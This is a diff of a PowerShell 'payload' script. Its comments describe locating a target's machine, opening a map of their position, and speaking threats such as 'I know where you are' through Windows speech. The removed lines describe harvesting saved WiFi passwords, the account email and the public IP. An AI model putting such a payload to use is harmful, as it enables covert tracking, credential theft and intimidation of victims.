@@ -22,14 +22,7 @@
 	The targets Location Services must be turned on or this payload will not work
 
 .SYNOPSIS
-	This script will get the users location and open a map of where they are in their browser and use windows speech to declare you know where they are  
-
-.DESCRIPTION 
-	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
-	The SSID and WiFi password of any current or previously connected to networks.
-	It determines the last day they changed thier password and how many days ago.
-	Once the information is gathered the script will pause until a mouse movement is detected
-	Then the script uses Sapi speak to roast their set up and lack of security
+	This script will get the users location and open a map of where they are in their browser and use windows speech to declare you know where they are
 #>
 
 #-----------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -145,10 +138,10 @@ $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -
 
 $s=New-Object -ComObject SAPI.SpVoice
 $s.Rate = -2
-$s.Speak("We found you $FN")
-$s.Speak("We know where you are")
-$s.Speak("We are everywhere")
-$s.Speak("Expect us")
+$s.Speak("I found you $FN")
+$s.Speak("I know where you are")
+$s.Speak("I am everywhere")
+$s.Speak("Expect me")
 
 
 #-----------------------------------------------------------------------------------------------------------------------------------------------------------
